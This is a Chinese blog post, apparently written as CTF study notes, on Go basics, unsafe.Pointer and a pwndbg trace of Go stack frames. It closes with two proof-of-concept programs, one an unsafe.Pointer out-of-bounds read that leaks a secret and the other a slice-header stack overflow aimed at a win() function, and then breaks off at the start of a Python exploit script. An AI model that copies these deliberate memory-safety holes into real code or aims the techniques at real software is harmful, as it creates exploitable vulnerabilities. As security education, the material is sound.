---
title: Go基础与unsafe.Pointer安全性浅析
id: 8
date: 2024-01-09 20:09:11
auther: yrl
cover: 
excerpt: go语言简述Go于2009年发布，当时多核处理器已经上市。Go语言在多核并发上拥有原生的设计优势，Go语言从底层原生支持并发，无须第三方库、开发者的编程技巧和开发经验。Go语言为并发而生Go语言的并发是基于 goroutine 的，goroutine 类似于线程，但并非线程。可以将 goroutin
permalink: /archives/go-ji-chu-yu-unsafepointer-an-quan-xing-qian-xi
categories:
 - ctf
 - go
tags: 
 - go
---

# go语言简述

Go于2009年发布，当时多核处理器已经上市。Go语言在多核并发上拥有原生的设计优势，Go语言从底层原生支持并发，无须第三方库、开发者的编程技巧和开发经验。

## Go语言为并发而生

Go语言的并发是基于 goroutine 的，goroutine 类似于线程，但并非线程。可以将 goroutine 理解为一种虚拟线程。Go 语言运行时会参与调度 goroutine，并将 goroutine 合理地分配到每个 CPU 中，最大限度地使用CPU性能。开启一个goroutine的消耗非常小（大约2KB的内存），你可以轻松创建数百万个goroutine。

goroutine的特点：

1. goroutine具有可增长的分段堆栈。这意味着它们只在需要时才会使用更多内存。
2. goroutine的启动时间比线程快。
3. goroutine原生支持利用channel安全地进行通信。
4. goroutine共享数据结构时无需使用互斥锁。

## go的性能

与其他现代高级语言（如Java/Python）相比，使用C，C++的最大好处是它们的性能，但是开发效率相对较低。因为C/ C++是编译型语言而不是解释的语言。 处理器只能理解二进制文件，Java和Python这种高级语言在运行的时候需要先将人类可读的代码翻译成字节码，然后由专门的解释器再转变成处理器可以理解的二进制文件（解释型语言）。
![1](/upload/2022/09/1.png)
和C/C++一样，go是编译型语言，它直接源代码编译成了处理器可以直接运行的二进制文件，执行效率更高，性能更好。同时简化了语法操作，兼顾了像python一样的开发效率。目前无论是大厂还是新兴的小公司都开始用go写/重构后端。

## go安装

ubuntu下直接`apt install golang`,开发环境可选择VSCode，安装插件 GO、vscode-go-syntax插件

## 语法特点

```go
package main

var x, y int
var (  // 这种因式分解关键字的写法一般用于声明全局变量
    a int
    b bool
)

var c, d int = 1, 2
var e, f = 123, "hello"

//这种不带声明格式的只能在函数体中出现
//g, h := 123, "hello"

func main(){
    g, h := 123, "hello"
    println(x, y, a, b, c, d, e, f, g, h)
}
```

[gobase](../../languagestudy/go/gobase.md#go语言结构)

注：go中字符串不是以`\x00`结尾，而是以特定长度结束，字符串实际上是有长度的
```go
type StringHeader struct {
    Data uintptr
    Len  int
}

这也是go代码的安全性较高的原因，编译后到处充斥着对数据边界的检查。

```
### 切片
make函数创建切片：
```go
var slice1 []type = make([]type, len)
```
也可以简写为
```go
slice1 := make([]type, len)
```
切片初始化：
```go
s :=[] int {1,2,3 } 
```
切片扩容append、切片拷贝copy

### 切片数据结构
编译期间的切片是 cmd/compile/internal/types.Slice 类型的，但是在运行时切片可以由如下的 reflect.SliceHeader 结构体表示，其中:

1. Data 是指向数组的指针;
2. Len 是当前切片的长度；
3. Cap 是当前切片的容量，即 Data 数组的大小：
```go
type SliceHeader struct {
	Data uintptr
	Len  int
	Cap  int
}
```
Data 是一片连续的内存空间，这片内存空间可以用于存储切片中的全部元素，数组中的元素只是逻辑上的概念，底层存储其实都是连续的，所以我们可以将切片理解成一片连续的内存空间加上长度与容量的标识。也可以说切片实际上是数组的封装，使用更灵活。

### go指针

Go语言中的指针不能进行偏移和运算，因此Go语言中的指针操作非常简单，我们只需要记住两个符号：&（取地址）和*（根据地址取值）。

Go语言中的值类型（int、float、bool、string、array、struct）都有对应的指针类型，如：*int、*int64、*string等。

### unsafe.Pointer

**Golang指针与C/C++指针的差别**
在Golang支持的数据类型中，是包含指针的，但是Golang中的指针，与C/C++的指针却又不同，主要表现在下面的两个方面：

1. 弱化了指针的操作，在Golang中，指针的作用仅是操作其指向的对象，不能进行类似于C/C++的指针运算，例如指针相减、指针移动等。从这一点来看，Golang的指针更类似于C++的引用
2. 指针类型不能进行转换，如int不能转换为int32
上述的两个限定主要是为了简化指针的使用，减少指针使用过程中出错的机率，提高代码的鲁棒性。但是在开发过程中，有时需要打破这些限制，对内存进行任意的读写，这里就需要unsafe.Pointer了。

**unsafe.Pointer的定义**

```go
type ArbitraryType int
type Pointer *ArbitraryType
```
可以看出unsafe.Pointer本质上是一个int型指针。

**unsafe.Pointer的功能介绍**
看一下Golang官网对于unsafe.Pointer的介绍：

1. 任意类型的指针值都可以转换为unsafe.Pointer（A pointer value of any type can be converted to a Pointer.）
2. unsafe.Pointer可以转换为任意类型的指针值（A Pointer can be converted to a pointer value of any type.）
3. uintptr可以转换为unsafe.Pointer（A uintptr can be converted to a Pointer.）
4. unsafe.Pointer可以转换为uintptr（A Pointer can be converted to a uintptr.）

从上面的功能介绍可以看到，Pointer允许程序突破Golang的类型系统的限制，任意读写内存，所以使用时需要额外小心，正如它的包名unsafe所提示的一样。

**注:** uintptr本质上是一个用于表示地址值的无符号整数，而不是一个引用，它表示程序中使用的某个对象的地址值。

**指针类型转换**
int64转int：
```go
func main() {
    i := int64(1)
    var iPtr *int
    // iPtr = &i // 错误
    iPtr = (*int)(unsafe.Pointer(&i))
    fmt.Printf("%d\n", *iPtr)
}
```
注意，这种类型转换，需要保证转换后的类型的大小不大于转换前的类型，且具有相同的内存布局，则可将数据解释为另一个类型。反之，如将int32的指针，转换为int64的指针，在后续的读写中，可能会发生错误。

**操作结构体成员**

这里以string、StringHeader为例：

```go
type stringStruct struct {
    str unsafe.Pointer
    len int
}

type StringHeader struct {
    Data uintptr
    Len  int
}
```

string和stringheader有相同的内存结构，所以可以修改结构体成员

```go
func main() {
    str1 := "hello world"
    hdr1 := (*reflect.StringHeader)(unsafe.Pointer(&str1)) // 注1
    fmt.Printf("str:%s, data addr:%d, len:%d\n", str1, hdr1.Data, hdr1.Len)

    str2 := "abc"
    hdr2 := (*reflect.StringHeader)(unsafe.Pointer(&str2))

    hdr1.Data = hdr2.Data // 注2
    hdr1.Len = hdr2.Len   // 注3
    fmt.Printf("str:%s, data addr:%d, len:%d\n", str1, hdr1.Data, hdr1.Len)
}
// str:hello world, data addr:4996513, len:11
// str:abc, data addr:4992867, len:3
```

## go函数调用特性

函数调用会用栈传递参数，返回值也是用栈传递，涉及到多返回值，被调函数的参数由调用者栈帧管理，调用规则大概是：
调用者栈帧为被调函数预留好空间，先在寄存器中准备好参数，然后调用函数时将其返回地址入栈，修改rsp为新栈帧开辟空间，保存调用者rbp，修改rbp值指向新栈帧，完成栈帧转换，函数结束时回收栈空间。
```go
package main

func myFunction(a, b int) (int, int) {
  return a + b, a - b
}

func main() {
  myFunction(66, 77)
}


```
gdb查看汇编：
```bash
pwndbg> disass main.main
Dump of assembler code for function main.main:
=> 0x0000000000455440 <+0>:     cmp    rsp,QWORD PTR [r14+0x10]
   0x0000000000455444 <+4>:     jbe    0x45546f <main.main+47>
   0x0000000000455446 <+6>:     sub    rsp,0x18
   0x000000000045544a <+10>:	mov    QWORD PTR [rsp+0x10],rbp
   0x000000000045544f <+15>:	lea    rbp,[rsp+0x10]
   0x0000000000455454 <+20>:	mov    eax,0x42
   0x0000000000455459 <+25>:	mov    ebx,0x4d
   0x000000000045545e <+30>:	nop
   0x0000000000455460 <+32>:	call   0x4553e0 <main.myFunction>
   0x0000000000455465 <+37>:	mov    rbp,QWORD PTR [rsp+0x10]
   0x000000000045546a <+42>:	add    rsp,0x18
   0x000000000045546e <+46>:	ret    
   0x000000000045546f <+47>:	call   0x452260 <runtime.morestack_noctxt>
   0x0000000000455474 <+52>:	jmp    0x455440 <main.main>
End of assembler dump.

pwndbg> disass main.myFunction
Dump of assembler code for function main.myFunction:
   0x00000000004553e0 <+0>:	    sub    rsp,0x18
   0x00000000004553e4 <+4>:	    mov    QWORD PTR [rsp+0x10],rbp
   0x00000000004553e9 <+9>:	    lea    rbp,[rsp+0x10]
   0x00000000004553ee <+14>:	mov    QWORD PTR [rsp+0x20],rax
   0x00000000004553f3 <+19>:	mov    QWORD PTR [rsp+0x28],rbx
   0x00000000004553f8 <+24>:	mov    QWORD PTR [rsp+0x8],0x0
   0x0000000000455401 <+33>:	mov    QWORD PTR [rsp],0x0
   0x0000000000455409 <+41>:	mov    rcx,QWORD PTR [rsp+0x20]
   0x000000000045540e <+46>:	add    rcx,QWORD PTR [rsp+0x28]
   0x0000000000455413 <+51>:	mov    QWORD PTR [rsp+0x8],rcx
   0x0000000000455418 <+56>:	mov    rbx,QWORD PTR [rsp+0x20]
   0x000000000045541d <+61>:	sub    rbx,QWORD PTR [rsp+0x28]
   0x0000000000455422 <+66>:	mov    QWORD PTR [rsp],rbx
   0x0000000000455426 <+70>:	mov    rax,QWORD PTR [rsp+0x8]
   0x000000000045542b <+75>:	mov    rbp,QWORD PTR [rsp+0x10]
   0x0000000000455430 <+80>:	add    rsp,0x18
   0x0000000000455434 <+84>:	ret    
End of assembler dump.

```
函数调用栈帧：

```asm
# 初始化的栈布局，main函数的调用者栈帧
00:0000│ rsp 0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
01:0008│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
02:0010│     0xc000038788 ◂— 0x0
... ↓        2 skipped
05:0028│     0xc0000387a0 ◂— 0x100000000000000
06:0030│     0xc0000387a8 ◂— 0x0
07:0038│     0xc0000387b0 —▸ 0xc0000001a0 —▸ 0xc000038000 ◂— 0x0
08:0040│     0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
09:0048│     0xc0000387c0 —▸ 0xc0000387a6 ◂— 0x100
0a:0050│     0xc0000387c8 —▸ 0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0b:0058│ rbp 0xc0000387d0 ◂— 0x0
0c:0060│     0xc0000387d8 —▸ 0x4524e1 (runtime.goexit.abi0+1) ◂— call   0x454860


->  sub    rsp,0x18    为main函数开辟栈帧
00:0000│ rsp 0xc000038760 ◂— 0x206
01:0008│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
02:0010│     0xc000038770 —▸ 0x455446 (main.main+6) ◂— sub    rsp, 0x18
03:0018│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
04:0020│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
05:0028│     0xc000038788 ◂— 0x0
... ↓        2 skipped
08:0040│     0xc0000387a0 ◂— 0x100000000000000
09:0048│     0xc0000387a8 ◂— 0x0
0a:0050│     0xc0000387b0 —▸ 0xc0000001a0 —▸ 0xc000038000 ◂— 0x0
0b:0058│     0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0c:0060│     0xc0000387c0 —▸ 0xc0000387a6 ◂— 0x100
0d:0068│     0xc0000387c8 —▸ 0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0e:0070│ rbp 0xc0000387d0 ◂— 0x0
0f:0078│     0xc0000387d8 —▸ 0x4524e1 (runtime.goexit.abi0+1) ◂— call   0x454860


->  mov    QWORD PTR [rsp+0x10],rbp    保存main函数调用者的rbp到栈[rsp+0x10]处
00:0000│ rsp 0xc000038760 ◂— 0x206
01:0008│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
02:0010│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
04:0020│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
05:0028│     0xc000038788 ◂— 0x0
... ↓        2 skipped
08:0040│     0xc0000387a0 ◂— 0x100000000000000
09:0048│     0xc0000387a8 ◂— 0x0
0a:0050│     0xc0000387b0 —▸ 0xc0000001a0 —▸ 0xc000038000 ◂— 0x0
0b:0058│     0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0c:0060│     0xc0000387c0 —▸ 0xc0000387a6 ◂— 0x100
0d:0068│     0xc0000387c8 —▸ 0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0e:0070│ rbp 0xc0000387d0 ◂— 0x0
0f:0078│     0xc0000387d8 —▸ 0x4524e1 (runtime.goexit.abi0+1) ◂— call   0x454860


->  lea    rbp,[rsp+0x10]     调整rbp指针指向main函数栈帧开始处，由此开始新的函数（main）调用
00:0000│ rsp 0xc000038760 ◂— 0x206
01:0008│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
02:0010│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
04:0020│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
05:0028│     0xc000038788 ◂— 0x0


  mov    eax,0x42
  mov    ebx,0x4d
  nop
->  call   0x4553e0 <main.myFunction>  ->  sub    rsp,0x18      main函数调用myFunction函数，保存其参数到寄存器，执行call命令（会将下一条指令地址入栈（返回地址））
  mov    rbp,QWORD PTR [rsp+0x10]
00:0000│ rsp 0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
01:0008│     0xc000038760 ◂— 0x206
02:0010│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
03:0018│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
04:0020│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
05:0028│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0


->  sub    rsp,0x18     myFunction函数的栈帧，为栈帧开辟空间
00:0000│ rsp 0xc000038740 ◂— 0x0
01:0008│     0xc000038748 ◂— 0x206
02:0010│     0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x206
05:0028│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
06:0030│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


->  mov    QWORD PTR [rsp+0x10],rbp      保存main函数的rbp指针到栈的[rsp+0x10]处
00:0000│ rsp 0xc000038740 ◂— 0x0
01:0008│     0xc000038748 ◂— 0x206
02:0010│     0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x206
05:0028│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
06:0030│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


->  lea    rbp,[rsp+0x10]        调整栈帧rbp从main函数的rbp转到myFunction的rbp，由此开始myFunction函数主体的调用
00:0000│ rsp 0xc000038740 ◂— 0x0
01:0008│     0xc000038748 ◂— 0x206
02:0010│ rbp 0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x206
05:0028│     0xc000038768 —▸ 0xc0000387d0 ◂— 0x0
06:0030│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


  mov    QWORD PTR [rsp+0x20],rax
->  mov    QWORD PTR [rsp+0x28],rbx        将函数参数保存到栈上（在返回地址的下面（高地址处）），参数由调用者（main）管理
  mov    QWORD PTR [rsp+0x8],0x0
  mov    QWORD PTR [rsp],0x0
00:0000│ rsp 0xc000038740 ◂— 0x0
01:0008│     0xc000038748 ◂— 0x206
02:0010│ rbp 0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x42 /* 'B' */
05:0028│     0xc000038768 ◂— 0x4d /* 'M' */
06:0030│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


  mov    QWORD PTR [rsp+0x8],0x0
->  mov    QWORD PTR [rsp],0x0          初始化myFunction返回值为0
00:0000│ rsp 0xc000038740 ◂— 0x0
01:0008│     0xc000038748 ◂— 0x0
02:0010│ rbp 0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x42 /* 'B' */
05:0028│     0xc000038768 ◂— 0x4d /* 'M' */
06:0030│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


  mov    rcx,QWORD PTR [rsp+0x20]
  add    rcx,QWORD PTR [rsp+0x28]
->  mov    QWORD PTR [rsp+0x8],rcx      计算a+b，然后将结果保存到栈上[rsp+0x8]处
  mov    rbx,QWORD PTR [rsp+0x20]
  sub    rbx,QWORD PTR [rsp+0x28]
  mov    QWORD PTR [rsp],rbx
00:0000│ rsp 0xc000038740 ◂— 0x0
01:0008│     0xc000038748 ◂— 0x8f
02:0010│ rbp 0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x42 /* 'B' */
05:0028│     0xc000038768 ◂— 0x4d /* 'M' */
06:0030│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


  mov    rcx,QWORD PTR [rsp+0x20]
  add    rcx,QWORD PTR [rsp+0x28]
  mov    QWORD PTR [rsp+0x8],rcx
  mov    rbx,QWORD PTR [rsp+0x20]
  sub    rbx,QWORD PTR [rsp+0x28]
->  mov    QWORD PTR [rsp],rbx           计算a-b，然后将结果保存到栈上[rsp]处
00:0000│ rsp 0xc000038740 ◂— 0xfffffffffffffff5
01:0008│     0xc000038748 ◂— 0x8f
02:0010│ rbp 0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x42 /* 'B' */
05:0028│     0xc000038768 ◂— 0x4d /* 'M' */
06:0030│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


  mov    rax,QWORD PTR [rsp+0x8]
->  mov    rbp,QWORD PTR [rsp+0x10]     myFunction函数调用完毕，恢复main函数（调用者）栈帧的rbp值
  add    rsp,0x18
  ret 
00:0000│ rsp 0xc000038740 ◂— 0xfffffffffffffff5
01:0008│     0xc000038748 ◂— 0x8f
02:0010│     0xc000038750 —▸ 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
04:0020│     0xc000038760 ◂— 0x42 /* 'B' */
05:0028│     0xc000038768 ◂— 0x4d /* 'M' */
06:0030│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
07:0038│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]


  mov    rax,QWORD PTR [rsp+0x8]
  mov    rbp,QWORD PTR [rsp+0x10]
->  add    rsp,0x18                     收回myFunction的栈空间
  ret 
00:0000│ rsp 0xc000038758 —▸ 0x455465 (main.main+37) ◂— mov    rbp, qword ptr [rsp + 0x10]
01:0008│     0xc000038760 ◂— 0x42 /* 'B' */
02:0010│     0xc000038768 ◂— 0x4d /* 'M' */
03:0018│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
04:0020│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
05:0028│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
06:0030│     0xc000038788 ◂— 0x0


  mov    rax,QWORD PTR [rsp+0x8]
  mov    rbp,QWORD PTR [rsp+0x10]
  add    rsp,0x18
->  ret                                 返回到main函数（call指令的下一条指令）
00:0000│ rsp 0xc000038760 ◂— 0x42 /* 'B' */
01:0008│     0xc000038768 ◂— 0x4d /* 'M' */
02:0010│ rbp 0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
04:0020│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
05:0028│     0xc000038788 ◂— 0x0


->  mov    rbp,QWORD PTR [rsp+0x10]     main函数调用完毕，恢复caller（main函数的调用者）栈帧rbp值
  add    rsp,0x18
  ret
00:0000│ rsp 0xc000038760 ◂— 0x42 /* 'B' */
01:0008│     0xc000038768 ◂— 0x4d /* 'M' */
02:0010│     0xc000038770 —▸ 0xc0000387d0 ◂— 0x0
03:0018│     0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
04:0020│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
05:0028│     0xc000038788 ◂— 0x0
... ↓        2 skipped
08:0040│     0xc0000387a0 ◂— 0x100000000000000
09:0048│     0xc0000387a8 ◂— 0x0
0a:0050│     0xc0000387b0 —▸ 0xc0000001a0 —▸ 0xc000038000 ◂— 0x0
0b:0058│     0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0c:0060│     0xc0000387c0 —▸ 0xc0000387a6 ◂— 0x100
0d:0068│     0xc0000387c8 —▸ 0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0e:0070│ rbp 0xc0000387d0 ◂— 0x0
0f:0078│     0xc0000387d8 —▸ 0x4524e1 (runtime.goexit.abi0+1) ◂— call   0x454860


  mov    rbp,QWORD PTR [rsp+0x10]
->  add    rsp,0x18                    收回main函数的栈空间
  ret                                  返回上层调用者
00:0000│ rsp 0xc000038778 —▸ 0x42df27 (runtime.main+551) ◂— mov    eax, dword ptr [rip + 0xbc01b]
01:0008│     0xc000038780 —▸ 0xc00001c180 ◂— 0x0
02:0010│     0xc000038788 ◂— 0x0
... ↓        2 skipped
05:0028│     0xc0000387a0 ◂— 0x100000000000000
06:0030│     0xc0000387a8 ◂— 0x0
07:0038│     0xc0000387b0 —▸ 0xc0000001a0 —▸ 0xc000038000 ◂— 0x0
08:0040│     0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
09:0048│     0xc0000387c0 —▸ 0xc0000387a6 ◂— 0x100
0a:0050│     0xc0000387c8 —▸ 0xc0000387b8 —▸ 0x42e060 (runtime.main.func2) ◂— cmp    rsp, qword ptr [r14 + 0x10]
0b:0058│ rbp 0xc0000387d0 ◂— 0x0
0c:0060│     0xc0000387d8 —▸ 0x4524e1 (runtime.goexit.abi0+1) ◂— call   0x454860


```
```
  
        |_______| low
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
    rsp |__...__| main caller
        |__...__|
    rbp |_______| high


   0x0000000000455460 <+32>:	call   0x4553e0 <main.myFunction>
   0x0000000000455465 <+37>:	mov    rbp,QWORD PTR [rsp+0x10]
        |_______| low
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
    rsp |__ret__|
        |__...__| main caller
        |__...__|
    rbp |_______| high


   0x00000000004553e0 <+0>:     sub    rsp,0x18 
   0x00000000004553e4 <+4>:	    mov    QWORD PTR [rsp+0x10],rbp
   0x00000000004553e9 <+9>:	    lea    rbp,[rsp+0x10]
        |_______| low
        |_______|
        |_______|
        |_______|
    rsp |_______| 
        |_______|
    rbp |_______| myFunction stack
        |__ret__|
        |__...__| main caller
        |__...__|
        |_______| high


   0x00000000004553ee <+14>:	mov    QWORD PTR [rsp+0x20],rax
   0x00000000004553f3 <+19>:	mov    QWORD PTR [rsp+0x28],rbx
        |_______| low
        |_______|
        |_______|
        |_______|
    rsp |_______| 
        |_______|
    rbp |_______|myFunction stack
        |__ret__|
        |__66___| main caller
        |__77___|
        |_______| high


   0x00000000004553f8 <+24>:	mov    QWORD PTR [rsp+0x8],0x0
   0x0000000000455401 <+33>:	mov    QWORD PTR [rsp],0x0
        |_______| low
        |_______|
        |_______|
        |_______|
    rsp |___0___| ret value
        |___0___|
    rbp |_______| myFunction stack
        |__ret__|
        |__66___| main caller
        |__77___|
        |_______| high


   0x0000000000455409 <+41>:	mov    rcx,QWORD PTR [rsp+0x20]
   0x000000000045540e <+46>:	add    rcx,QWORD PTR [rsp+0x28]
   0x0000000000455413 <+51>:	mov    QWORD PTR [rsp+0x8],rcx
   0x0000000000455418 <+56>:	mov    rbx,QWORD PTR [rsp+0x20]
   0x000000000045541d <+61>:	sub    rbx,QWORD PTR [rsp+0x28]
   0x0000000000455422 <+66>:	mov    QWORD PTR [rsp],rbx
        |_______| low
        |_______|
        |_______|
        |_______|
    rsp |__-11__| ret value
        |__0x8f_|
    rbp |_______| myFunction stack
        |__ret__|
        |__66___| main caller
        |__77___|
        |_______| high


   0x0000000000455426 <+70>:	mov    rax,QWORD PTR [rsp+0x8]
   0x000000000045542b <+75>:	mov    rbp,QWORD PTR [rsp+0x10]
        |_______| low
        |_______|
        |_______|
        |_______|
    rsp |__-11__| ret value
        |__0x8f_|
        |_______| myFunction stack
        |__ret__|
        |__66___| main caller
        |__77___|
    rbp |_______| high


   0x0000000000455430 <+80>:	add    rsp,0x18
        |_______| low
        |_______|
        |_______|
        |_______|
        |__-11__| ret value
        |__0x8f_|
        |_______| myFunction stack
    rsp |__ret__|
        |__66___| main caller
        |__77___|
    rbp |_______| high


   0x0000000000455434 <+84>:	ret
        |_______| low
        |_______|
        |_______|
        |_______|
        |__-11__| ret value
        |__0x8f_|
        |_______| myFunction stack
        |__ret__|
    rsp |__66___| main caller
        |__77___|
    rbp |_______| high
```

总而言之，go的函数调用约定是在函数调用前，参数（右->左）入栈，返回地址入栈，然后是局部变量入栈，（多）返回值的位置根据调试是在栈内，并不是在调用者函数栈帧内，网上普遍的说法是初始化返回值是在紧挨参数的高地址处，但是经过调试并不是，可能是文章比较早，后面有所调整。整体和C的栈大同小异。

与C函数调用的区别：
1. 函数存在多个返回值，在栈上存储，参数也由栈上传递
2. go的局部变量由rsp为基准索引，c的局部变量以rbp为基准

# Go Unsafe.Pointer导致的安全问题

为了能对内存进行操作引入的标准库Unsafe包破坏了go的安全性。

## 信息泄露

这个POC证明展示了使用不同长度的转换缓冲区如何使用unsafe.Pointer导致缓冲区溢出，从而在这种情况下导致信息泄漏漏洞。

POC:
```go

package main

import (
	"fmt"
	"unsafe"
)

func main() {
	harmlessData := [8]byte{'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'}
	// might be e.g. private key data
	secret := [17]byte{'l', '3', '3', 't', '-', 'h', '4', 'x', 'x', '0', 'r', '-', 'w', '1', 'n', 's', '!'}

	// read from memory behind buffer
	var leakingInformation = (*[8 + 17]byte)(unsafe.Pointer(&harmlessData[0]))

	fmt.Println(string((*leakingInformation)[:]))

	// avoid optimization of variable
	if secret[0] == 42 {
		fmt.Println("do not optimize secret")
	}
}

// ➜  code-informationLeak ./main
// AAAAAAAAl33t-h4xx0r-w1ns!
```
**漏洞机制**
使用 的任意类型转换特权unsafe.Pointer，将[8]byte数组值转换为[25]byte值。读取时，这会从内存中泄漏额外的数据。

## 代码流重定向

这个POC证明了不正确的数组转换如何导致代码流重定向漏洞，执行二进制文件中的函数。

```go
package main

import (
	"bufio"
	"fmt"
	"os"
	// "reflect"
	// "unsafe"
)

func win() {
	fmt.Println("win!")
}

var reader = bufio.NewReader(os.Stdin)

func main() {
	harmlessData := [8]byte{'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'}

	confusedSlice := make([]byte, 512)
	sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&confusedSlice))
  // fmt.Printf("%p\n", &sliceHeader.Data)
	harmlessDataAddress := uintptr(unsafe.Pointer(&(harmlessData[0])))
	sliceHeader.Data = harmlessDataAddress

	_, _ = reader.Read(confusedSlice)

	// avoid optimization of win2
	if harmlessData[0] == 42 {
		win()
	}

	// input a padding and overflow $rip. Use address of win.
	// DEP will prevent to input shell code and jump to it. Instead: use ROP.
}

```
由于slice分配的内存不固定，所以可以用`sliceHeader.Data`来输出地址，以便分析。
```python
#!/usr/bin/env python2

import struct

pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"
